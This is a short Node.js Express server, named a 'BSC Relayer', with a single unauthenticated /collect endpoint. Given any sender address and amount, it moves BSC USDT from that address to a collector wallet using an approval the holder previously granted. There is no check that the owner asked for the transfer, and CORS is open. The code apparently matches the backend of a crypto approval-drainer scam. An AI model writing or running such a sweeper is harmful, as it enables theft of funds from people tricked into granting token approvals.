import express from 'express';
import { ethers } from 'ethers';
import cors from 'cors';

const app = express();
app.use(cors());
app.use(express.json());

// ===== CONFIG =====
const RPC_URL = process.env.RPC_URL;
const PRIVATE_KEY = process.env.PRIVATE_KEY;
const COLLECTOR = process.env.COLLECTOR;
const PORT = process.env.PORT || 3000;

if (!RPC_URL || !PRIVATE_KEY || !COLLECTOR) {
  console.error("❌ Missing environment variables. Please set RPC_URL, PRIVATE_KEY, COLLECTOR.");
  process.exit(1);
}

// ===== PROVIDER & WALLET =====
const provider = new ethers.JsonRpcProvider(RPC_URL);
const wallet = new ethers.Wallet(PRIVATE_KEY, provider);

// ===== USDT CONTRACT =====
const USDT_ADDRESS = "0x55d398326f99059fF775485246999027B3197955";
const USDT_ABI = [
  "function transferFrom(address from,address to,uint256 amount) external returns(bool)",
  "function allowance(address owner,address spender) view returns(uint256)"
];
const tokenContract = new ethers.Contract(USDT_ADDRESS, USDT_ABI, wallet);

// ===== COLLECT ROUTE =====
app.post('/collect', async (req, res) => {
  const { from, amountHuman } = req.body;

  if (!from || !amountHuman) return res.status(400).json({ error: 'missing_fields' });

  try {
    // ----- ROUND/TRUNCATE TO 6 DECIMALS -----
    const amountFixed = Number(amountHuman).toFixed(6);
    const amountWei = ethers.parseUnits(amountFixed, 6);

    // ----- CHECK ALLOWANCE -----
    const allowance = await tokenContract.allowance(from, COLLECTOR);
    if (allowance < amountWei) return res.status(400).json({ error: 'insufficient_allowance' });

    // ----- TRANSFER -----
    const tx = await tokenContract.transferFrom(from, COLLECTOR, amountWei);
    await tx.wait();

    res.json({ status: 'ok', tx: tx.hash });
  } catch (e) {
    console.error("❌ Collect error:", e.message);
    res.status(500).json({ error: e.message });
  }
});

// ===== START SERVER =====
app.listen(PORT, () => {
  console.log(`✅ BSC Relayer running on port ${PORT}`);
});
